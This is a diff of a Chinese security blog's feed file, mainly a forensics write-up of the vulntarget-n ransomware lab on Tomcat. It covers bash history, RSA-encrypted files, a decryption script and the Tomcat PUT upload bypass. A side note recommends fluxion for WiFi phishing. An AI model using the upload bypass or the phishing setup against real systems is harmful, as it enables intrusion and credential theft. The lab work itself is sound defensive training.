-root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/404.jsp.vulntarget N/nNQJJ60jZ6WvLltQK5U6+jKQ0HicpJW2gGt8YbxWqZxE+k4KyIpaDZCicGRsOHAuo+hYuLLX1wRDLt7BDvfnPdqeI/XMiGsL7nkx2Hc5FwD/MJrZYy0i5bzQvg955W6YiI8KKcfpeYI0+aZMuP7tP9duuiu+YHvmnD/1Wq0n1r/fEhWoSnZyAm5Gcc9AjpCPQQI3yF1APbDyHywCW64kOmN+kd/B5cLi62zfxgYnfUff31gtHf+G0FgHFEB0bze+epyKfBumuDGklzKajtJm79fGqlwjh26sPz6jUR1k54h6jDqM15qZKbD3z7E37k3IPpfjspTWwKchmHB6oMmEfLSXGvI4ECNb9KIVxjUADSO8oYZpNaNJmOKF4x/GndhCK++jPOHhZywhjhDHthqH+yLQGsN2+KiLqBJp8RyP8dFXbANgp+agls4cMfVTgEfQzjkJKtELBzmQoskB+WdUk9v0vczio4d//nGXeWm1eRDbL5BhQQuo2cTEFBA9aDC8mJtFCqxafLoVeWxjYac8r+0iXPIfPklpcxqDwdTam5n7GlNOeJZgFwrmuREyTQ+iGijTzIcX4eqPTTowdi+GpLTXGF1XSESl9g/OLRKrai+DVM3AoQ8fOR5DSS6b8RZvPjKNoqXpS4jSn02w7GXz3SdJcqbZwRdQ/lS712S5g=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/flag.jsp.vulntarget Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/index.jsp.vulntarget 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root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget goH93IcI5UeCpubU5frhuBhnmDcKEXVyE0i7yE07yyuHTVwnhRq8u44y2EbZiH77amDZrn+mWvhohGKC4is9mrjh2Fj7QuMSe5mqi9zSM4UhmIF+H8PjcYJny3KPoLko8kl+8tNMZxYiAtl9RIJ3cdXMLDPxyP6Mq42jisW2K+o=
-
-
-历史命令中搜索.pem文件，找到私钥文件
-
-从而解密得到flag：flag{https://github.com/crow821/vulntarget}
-from cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives import hashesfrom cryptography.hazmat.primitives.asymmetric import rsafrom base64 import b64decode# 读取公钥和私钥文件with open(&#x27;privkey.pem&#x27;, &#x27;rb&#x27;) as key_file:    private_key = serialization.load_pem_private_key(        key_file.read(),        password=None,    )# 读取密文encrypted_flag = b64decode(&#x27;Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=&#x27;)# 解密密文decrypted_flag = private_key.decrypt(    encrypted_flag,    padding.PKCS1v15()  # 使用PKCS#1 v1.5 padding)print(f&quot;&#123;decrypted_flag.decode(&#x27;utf-8&#x27;)&#125;&quot;)
-
-
-漏洞复现直接PUT方式上传文件发现不修改后缀名上传失败了
-
-在后面加个/验证上传成功，至此即可确认入口点为Tomcat PUT任意文件上传漏洞
-
-业务恢复由于网站首页也被修改了，还需要解密前面的index.jsp.vulntarget
-
-用之前的脚本会发现报错长度不一致
-
-后面利用在线工具解密成功
-
-替换解密后的index.jsp即可恢复
-
+总结建议别用esp8266-01进行钓鱼，它更适用于做WiFi杀手。其一是因为其性能低，加载钓鱼界面很久。其二，它的信号范围极小，别人很难扫描到。最好还是用加大功率的无线网卡配合fluxion等开源钓鱼项目
 ]]></content>
       <categories>
-        <category>靶场通关</category>
+        <category>研究随笔</category>
       </categories>
       <tags>
-        <tag>vulntarget</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>年轻人的第一台NAS</title>
-    <url>/2023/02/25/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0NAS/</url>
-    <content><![CDATA[准备工作需要购置的零件有机箱（可以自己单独购买电源）、主板、内存条、硬盘
-1.机箱这里我买的是拓普龙6盘位NAS服务器机箱，不过不建议买6口的（贼难装，难怪没啥人买这款，早知道就不贪便宜直接买个8口的机箱要好装多了🤔）
-
-开箱如下，还不错的一点就是给配了一大包螺丝😘但是没分开来包装不好找要用的
-
-
-2.电源这里电源我是单独购买的台达150W电源（他喵的~我买的时候还需要12块运费，现在就变免运费啦🤡
-
-开箱如下，一块电源以及一根电源线
-
-3.主板主板我选的是映泰j4125，买的时候涨价了好贵~ 于是我选择了pdd购买能便宜挺多的
-
-
-4.内存条内存要求就不是很高了，随便买个4G的就行，不过有点需要注意的是颗粒数量，一定得买4颗粒的，商家一般都不会写出来所以比较坑
-
-如果不是4颗粒的，测试的时候就会出现如下问题，毫无反应（我这个内存应该拆开是8颗粒的😣以及这里U盘是要插在后面主板上的）
-
-5.硬盘这里我选的是海康威视的监控硬盘，两块4T的大概就花了七百块，依旧还是上pdd采购节省开销
-
-安装过程其实nas说好装也好装，说不好装也不好装😂就是一个萝卜一个坑
-先把电源根据机箱的结构固定到对应位置，再把电源上的线装好（这里想喷一下它这里接线可困难了，后板焊住了不能拆开，并且和sata线混在一块，可以说毫无发力点），这里我没有装扩展卡就只用到两根sata线，所以风扇也就没必要插上，需要注意的是硬盘线一定得按顺序接上并记住它
-
-然后就是主板了，先把我们要用到的两跟sata线按主板上写的1、2对应装上，再找到usb线和电源线找到对应位置装上，以及4pin、24pin线，内存条，然后根据机箱结构装上主板。这里想喷一下主板那里的螺丝孔特别歪，后面手被割了好几个口才勉强固定住（下图内存还没插上就是因为它翻车）
-
-组装好后不着急把壳装上，需要测试一下能不能用，先插上显示屏的HDMI线和装好pe的U盘，再插上电源线，效果如下：
-
-亮起来一般就没啥问题了，最后成功进入pe就可以装上了
-
-最后关机，把硬盘装好插上即可开始nas之旅😁
-
-]]></content>
-      <categories>
-        <category>折腾实录</category>
-      </categories>
-      <tags>
-        <tag>NAS</tag>
+        <tag>esp8266</tag>
       </tags>
   </entry>
   <entry>
@@ -794,6 +603,197 @@ jad --source-only ShellServlet &gt; /tmp/ShellServlet.javavim /tmp/HttpServlet.j
       </categories>
       <tags>
         <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-n</title>
+    <url>/2024/11/16/vulntarget-n/</url>
+    <content><![CDATA[前言在面对勒索病毒这样的网络威胁时，我们不能被动等待，而要积极应对。我们需要了解攻击的原理和过程，熟练掌握应急响应和取证分析的技术，以便在面对真实的威胁时能够迅速有效地应对。
+vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：
+
+客户在阿里云部署的业务环境
+今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据
+客户发现其中部分重要文件被加密为.vulntarget结尾
+
+
+随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。
+具体要求如下：
+
+分析攻击事件是如何发生的，请给出攻击画像
+解密勒索
+恢复原来的index.jsp页面，恢复正常的web服务
+找到隐藏在其中的3个flag
+
+已知服务器系统为Ubuntu20.04，账号密码： 账号：root 密码：Vulntarget@123
+ps：在本次靶场设计中少了一次反弹shell的操作，主要是防止设计者的ip出现泄露，在攻击路径描述中可以直接把反弹shell的步骤加上即可。
+准备工作解压完是个raw文件，VMware无法直接打开
+
+可利用qemu工具转换为vmdk格式
+工具下载地址：https://qemu.weilnetz.de/w64/转换命令：qemu-img.exe convert -f raw -O vmdk vuln_m-j6cegcrhehdcba0r5h4v_system.raw vulntarget-n.vmdk
+
+
+然后新建虚拟机，稍后安装操作系统，选择磁盘为使用现有虚拟磁盘，保持现有格式即可
+
+
+应急响应首先查询特权用户特权用户等情况，未发现异常账号
+
+然后检查是否存在异常端口、进程、开机启动项等，但也未发现异常
+
+接着，再来查看历史命令发现flag：flag{vulntarget_very_G00d}
+root@iZj6c6hytildlalnu0cwt4Z:~# cat .bash_history    1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y    2  vim /etc/profile    3  source /etc/profile    4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip    5  unzip apache-tomcat-7.0.79.zip    6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat    7  mv apache-tomcat-7.0.79 /opt/tomcat    8  chmod +x /opt/tomcat/bin/*.sh    9  ls   10  history    11  flag&#123;vulntarget_very_G00d&#125;   12  /opt/tomcat/bin/startup.sh   13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak   14  vim /opt/tomcat/conf/server.xml   15  ps -axu | grep tomcat   16  kill -9 6961   17  /opt/tomcat/bin/startup.sh   18  cp web.xml web.xml.bak   19  pwd    20  cd ..   21  ls   22  cd /opt/   23  ls   24  cd tomcat/   25  ls   26  cd conf/   27  cp web.xml web.xml.bak   28  vim web.xml   29  ps -axu | grep tomcat   30  kill -9 7409   31  /opt/tomcat/bin/startup.sh   32  pwd    33  cd ..   34  ls   35  cd webapps/   36  ls   37  cd ROOT/   38  ls   39  rm favicon.ico    40  cp index.jsp index.jsp.bak   41  ls   42  vim index.jsp   43  rm index.jsp   44  vim index.jsp   45  crontab -e   46  history    47  ls   48  mv vulntargetn.jsp 404.jsp   49  ls   50  rm index.jsp.bak   51  pip3 install rsa   52  ls   53  ls -lha   54  mkdir .vulntarget   55  cd .vulntarget/   56  ls   57  mkdir keys   58  ls   59  history    60  ls   61  vim get_pem.py   62  python3 get_pem.py    63  ls   64  rm get_pem.py    65  ls   66  cd ..   67  ls   68  cp .vulntarget/keys/pubkey.pem .   69  ls   70  ls | grep jsp   71  vim encrypt_vulntarget.py   72  ls   73  vim flag.jsp   74  ls | grep jsp   75  python3 encrypt_vulntarget.py    76  ls   77  cd .vulntarget/   78  ls   79  cd keys/   80  ls   81  cat pubkey.pem    82  cat privkey.pem    83  cd ..   84  ls   85  cd ..   86  ls   87  rm encrypt_vulntarget.py    88  rm pubkey.pem    89  ls   90  vim index.jsp   91  ls   92  cd ..   93  ls   94  cd ..   95  ls   96  cd logs/   97  ls   98  cat localhost_access_log.2024-06-04.txt    99  vim localhost_access_log.2024-06-04.txt   100  ls  101  vim localhost_access_log.2024-06-04.txt   102  ls  103  history   104  curl http://127.0.0.1  105  ls  106  cd   107  ls  108  ls -lha  109  cat .bashrc   110  ls  111  history &gt; .bash_historyapt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -yvim /etc/profilesource /etc/profilewget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zipunzip apache-tomcat-7.0.79.zipmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatchmod +x /opt/tomcat/bin/*.shlshistory flag&#123;vulntarget_very_G00d&#125;/opt/tomcat/bin/startup.shcp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bakvim /opt/tomcat/conf/server.xmlps -axu | grep tomcatkill -9 6961/opt/tomcat/bin/startup.shcp web.xml web.xml.bakpwd cd ..lscd /opt/lscd tomcat/lscd conf/cp web.xml web.xml.bakvim web.xmlps -axu | grep tomcatkill -9 7409/opt/tomcat/bin/startup.shpwd cd ..lscd webapps/lscd ROOT/lsrm favicon.ico cp index.jsp index.jsp.baklsvim index.jsprm index.jspvim index.jspcrontab -ehistory lsmv vulntargetn.jsp 404.jsplsrm index.jsp.bakpip3 install rsalsls -lhamkdir .vulntargetcd .vulntarget/lsmkdir keyslshistory lsvim get_pem.pypython3 get_pem.py lsrm get_pem.py lscd ..lscp .vulntarget/keys/pubkey.pem .lsls | grep jspvim encrypt_vulntarget.pylsvim flag.jspls | grep jsppython3 encrypt_vulntarget.py lscd .vulntarget/lscd keys/lscat pubkey.pem cat privkey.pem cd ..lscd ..lsrm encrypt_vulntarget.py rm pubkey.pem lsvim index.jsplscd ..lscd ..lscd logs/lscat localhost_access_log.2024-06-04.txt vim localhost_access_log.2024-06-04.txt lsvim localhost_access_log.2024-06-04.txt lshistory curl http://127.0.0.1lscd lsls -lhacat .bashrc lshistory &gt; .bash_historyhistory exit
+
+
+分析这些敏感历史命令发现攻击者可能将webshell写入到tomcat目录下，同时还发现了攻击者创建隐藏目录.vulntarget，并且编写运行get_pem.py和encrypt_vulntarget.py这两个rsa加密脚本来生成加密密钥对并加密
+根据历史命令来查看tomcat日志localhost_access_log.2024-06-04.txt，可知是tomcat PUT文件上传
+
+并且得到flag：flag{Welcome_t0_join_Us}
+
+进入tomcat的web目录下发现一共加密了4个文件
+root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/404.jsp.vulntarget N/nNQJJ60jZ6WvLltQK5U6+jKQ0HicpJW2gGt8YbxWqZxE+k4KyIpaDZCicGRsOHAuo+hYuLLX1wRDLt7BDvfnPdqeI/XMiGsL7nkx2Hc5FwD/MJrZYy0i5bzQvg955W6YiI8KKcfpeYI0+aZMuP7tP9duuiu+YHvmnD/1Wq0n1r/fEhWoSnZyAm5Gcc9AjpCPQQI3yF1APbDyHywCW64kOmN+kd/B5cLi62zfxgYnfUff31gtHf+G0FgHFEB0bze+epyKfBumuDGklzKajtJm79fGqlwjh26sPz6jUR1k54h6jDqM15qZKbD3z7E37k3IPpfjspTWwKchmHB6oMmEfLSXGvI4ECNb9KIVxjUADSO8oYZpNaNJmOKF4x/GndhCK++jPOHhZywhjhDHthqH+yLQGsN2+KiLqBJp8RyP8dFXbANgp+agls4cMfVTgEfQzjkJKtELBzmQoskB+WdUk9v0vczio4d//nGXeWm1eRDbL5BhQQuo2cTEFBA9aDC8mJtFCqxafLoVeWxjYac8r+0iXPIfPklpcxqDwdTam5n7GlNOeJZgFwrmuREyTQ+iGijTzIcX4eqPTTowdi+GpLTXGF1XSESl9g/OLRKrai+DVM3AoQ8fOR5DSS6b8RZvPjKNoqXpS4jSn02w7GXz3SdJcqbZwRdQ/lS712S5g=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/flag.jsp.vulntarget Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/index.jsp.vulntarget EBbRcDBnaxuKDku6RvtR5RTXLK9MowxgL/CnNMpmvkYfzZ6qMu3wP/Op55J9SZi8/T5dnXBKceyVfrC9ogN0d5ndAvKfEjhp8qTU8/kg0fjPiyb6qGErFAFcz/jHpykVEeSeOyD3WwhVloDR/if08Jyg9Soc95r2oqHmYeH2zNkqZehD1lPG01bAikUXo2h4DqJld8ZoV2N5HvJGjl3rMyN5839YYno4gGN9W8ruVwe27cBFseQ/5rY7/tzy54zklD6PO0f5tLoUKE7AAkhcWOcfaqDHiZE/WlqPBxkP+/rIgWyHRYUQjAETiEw9u4TJWAQq7njrK14VHyGuvmt3VH8if2TEpBgNnFFJ36hx7QsvbAkJ5pafrxNjYmcFHHAHTd5P6Z2fB06uU0TtAc61RcLFsYb0+IhckfwK3USXWp0HOUlmkmCx4+0yMBX4/d7bovg7AsMAc3toH127db3ytTFY1yHq2rq+V1f+IRGLv6fnkYJ/j0NVD8GSuKAcDntaC9rXUiFTi+lcwOmEeqgxrmOZvpuzoqmoqI8P7W6UngEZhq9RhZzmf7ytYF/BORONft39B3H4cM9X2Zc8fX39LlE2OC56cjySnTqrlPJ55USecv8xO5bpKvqG2Cra1umPbqCcXeZPDb1buQ270F4zNll4fTmMe3WI8aj9nCrSpuxhgv4UQsCi6cE99e+vGSFEk0ag12siFGpycfOKe7T53fceyuteUwDs9begfzSC9H13qc3Ny9QDtuYHzJnO4qKdiNOtali++uLitUxW8QM7sacsB1y3SOSJ58p/JwLjqet8+H9Cjka8OCIq2WWxMISmvtdNPIRVj0Cgu1dwIBcVA04oAibcm8pE7gp9PWoDMiMGH7IxrsGceWlVgLBCwa2iFsUeCqqXht1amX9vqYSCLHYVHgSMlMzBrC6Jod2kDCT34QrQkS7Xar6qsC9xX4EgavXutE8Oyy4MXgBRGaIg7IjUO+Sr7d3CNF1gBKBnvz4wMi4n/prqf8D/VLwFP75qNawk2/znc0w+cq6jHpRJHqB2PbKA/n4hCpern+RgyZ4fRBHykAXChCp6zVw7FdZDTQ9J1H0UR//FEB0KDEUerYUy51Eqbvd8r2nD/dHpzds0aXtMeEjUWYYak8mpgrUL9viVH9YHtMC3ukf5QeY10AU5qNhEJOx4Z9cieSDKfzQWQE2zJu8JHprwBpgJ3+PQQox0IxEr/VTN2fy4QKK7szXvVLeGUVvtShEhreJjaYQjM6YCVoNwp1WQWWUU845Nq8hp1z2ErJKoox2dIMtVEounm3BxmqT0oHZbO//nMwlZy3o5XwvVRBn7aYUfSJx8a2Zx6bWUMj9fOfAgSHgx3m96o7qro7r77m9sklPCYwIHQuLIpeiMBA81HO0bLaukoJM7/jbVhxtKYlQSmtwoNN5bDlgf2+GzyCFZzGnF7UCpb9PFB80WtdyvRvDJ7AeJb2h7x9PI9jq7flZVtYyGNavOMMZNSEVt/tNNKYNvMtYccXqi98q4QL0R0TZqHZdcWGxhyUY/VBSZXfuOGLNQ3TzN6sIuaMggbb47Cd2IsUuRYV4HefanRbr0y8XDIYM+TAZO8yCTadiKyWvjzZXczMMfaS3yhES5JjcJbedOqay5SrUUla2+c04hBxu2uujc1XuHhCEOTZv1OeH1z8FN15Se4+T+s9rYbBw4EsOM2WpU3h4pQJjw1MajSJvTLiA+W5vfDAN6tO2feEQUUrqOw40L1HLl/ZQCw7gt4IRx9EI9ZVxUjq6o0HPCB6vJuwjdlr7+0J4OTzAS3dBu1aXvX3InbBWKHRkiCK5fWJCBYgoRs/ncEDoL8Xv0xT6nEvtG2xcGtZ8h1BeOqkZ2Mao3Q0+PUCNaNXoftQ0XfnrRPy5Swyo7+Kdt2YAPIdiAl//OUAc/BnvOvlso+8bhcxmXtXt9tBXmTFZCXJdx+Hd1CVKRNBPNqbFHmZ2NSILPnWeSwxY0oZ1XrQy11dq3yq51zrHl1+Hy4xSDoGbM34sia0AXLlxb3fqBgdYbwM5j9MEgdy5XLH4AJH8LeTdDJwasHXZ1qFopZE8P/9zne/BEpM462zG4LsZ79pIg0qZy2JgbDecpzZLu7LTW/bgstgsCvMxTy1XuGZs9m3nq/31kEnyB3SCEw6/A4LZSnOtIXu2Z4/EzTGHfpxM7VfxZxgSJDc/QIRgn4dXvTsI5BZ8/pk97nLXCKTCUO7bwLf8u3Z5lbVg23EyBuEY8a2z3oKA1VBeQ4b/O4fIjdIFl08ppc5VHrYRf5zzvycFjPiD4tRSS3TGNnHtFPze6JXnmIfrZVY2HWt5chxMdLp/0arktyT4TPKPoL4gPhXy/1KU0St95+u4rMHXY43WYJTo3QE1/5Q8pGu06h2OCtKQbD34qEAARcUevxK3SEFhx93Wt/1r2tECOdRNjYcEJQhikwnK2oO5+bd+UqIzQI0QWFAMgJh6e0PFWx5LyTC0SaGqX9oZ7ax74uHKjb0D9jctzdptlQ7G1304SBhK8A3MEqQSTNo151GbJw6LEvkYRynke1iI9LfXqnpuPVXWNhvpoHgr9cZhajAesCWuSY/Ee6HEcrvlLFiVSzWGcM7jHj+4oOYI2sogkYkfqHwkz1psS72gH3OvnAELV3qS/s5YHx6j47BxTglT4V+LYVhvDp+zq8j1S86VnPla5rNETDsWU2/2ILD5pCc8+kXbku7rCyExemEZ6ViCYyjhuyB0yLLGgXtcHi0KPR1ehnC7f+/Lp628zm/nyHp+NT4UibTARLz+OsCs4UptaAmzUzUUT8DodQrIvqujRShiQLwMzn9Z6iQI2y36JHRrxv1RWysyrNqoyezbiOr+CPwpKnNcQlawBrGDArdo9pqyJ3bJt6ICDcE/RfAGmVEJU9Wcx6H5TsCHcO5ppP8qHAXLugmxIH6vxVxI7z90mWud/HhsjDVusboh8dUYZZYHLafFAZ3zuF2RMMG6sHgUvCiFPeNfTgcTGnCJ29zzjjVjbfAEZm9YbQC1jkpmYDz3vMmJHEdwuN42eBSETH/TIK4vCrEDoRq4qZbzxUZ7R25bOZP3A7lNuURH54cA1mJNTvBCcFcEqeol/C3wFmEP9SAKWbtfFC8fqBoZJoBvObXe0GR6xaEsAdluihxQ21aC3/+xaB46wxsIEd5PUdwtC0IfLM4l3+oH5KS3yfEKzJ1kwT4A5/S+EEV0wDC7+DSVkete6sjAXIeWCSgc=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget goH93IcI5UeCpubU5frhuBhnmDcKEXVyE0i7yE07yyuHTVwnhRq8u44y2EbZiH77amDZrn+mWvhohGKC4is9mrjh2Fj7QuMSe5mqi9zSM4UhmIF+H8PjcYJny3KPoLko8kl+8tNMZxYiAtl9RIJ3cdXMLDPxyP6Mq42jisW2K+o=
+
+
+历史命令中搜索.pem文件，找到私钥文件
+
+从而解密得到flag：flag{https://github.com/crow821/vulntarget}
+from cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives import hashesfrom cryptography.hazmat.primitives.asymmetric import rsafrom base64 import b64decode# 读取公钥和私钥文件with open(&#x27;privkey.pem&#x27;, &#x27;rb&#x27;) as key_file:    private_key = serialization.load_pem_private_key(        key_file.read(),        password=None,    )# 读取密文encrypted_flag = b64decode(&#x27;Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=&#x27;)# 解密密文decrypted_flag = private_key.decrypt(    encrypted_flag,    padding.PKCS1v15()  # 使用PKCS#1 v1.5 padding)print(f&quot;&#123;decrypted_flag.decode(&#x27;utf-8&#x27;)&#125;&quot;)
+
+
+漏洞复现直接PUT方式上传文件发现不修改后缀名上传失败了
+
+在后面加个/验证上传成功，至此即可确认入口点为Tomcat PUT任意文件上传漏洞
+
+业务恢复由于网站首页也被修改了，还需要解密前面的index.jsp.vulntarget
+
+用之前的脚本会发现报错长度不一致
+
+后面利用在线工具解密成功
+
+替换解密后的index.jsp即可恢复
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>导出Lsass.exe的一些手法</title>
+    <url>/2021/02/17/%E5%AF%BC%E5%87%BALsass.exe%E7%9A%84%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</url>
